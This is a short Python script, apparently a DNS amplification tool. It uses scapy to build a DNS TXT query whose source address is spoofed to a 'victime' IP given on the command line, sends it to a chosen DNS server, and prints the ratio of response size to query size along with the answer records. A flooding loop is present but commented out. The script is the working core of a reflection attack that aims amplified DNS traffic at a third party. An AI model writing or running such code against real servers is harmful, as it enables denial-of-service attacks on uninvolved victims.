from scapy.all import *

import sys

import socket

import time

server_ip = sys.argv[1]

victime_ip = sys.argv[2]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# while True :

packet = IP(dst=server_ip, src=victime_ip) / UDP(dport=53, sport=5530) / DNS(id=12, qd=DNSQR(qname='google.com', qtype='TXT'))

sock.sendto(bytes(packet), (server_ip, 53))

data, address = sock.recvfrom(1024)

data = bytes(data)

response = IP(_pkt=data) / UDP(_pkt=data) / DNS(_pkt=data)

print(len(response[DNS]) / len(packet[DNS]))

if response.haslayer(DNS) :

	for i in range(response[DNS].ancount) :

		print(response[DNS].an[i].rdata)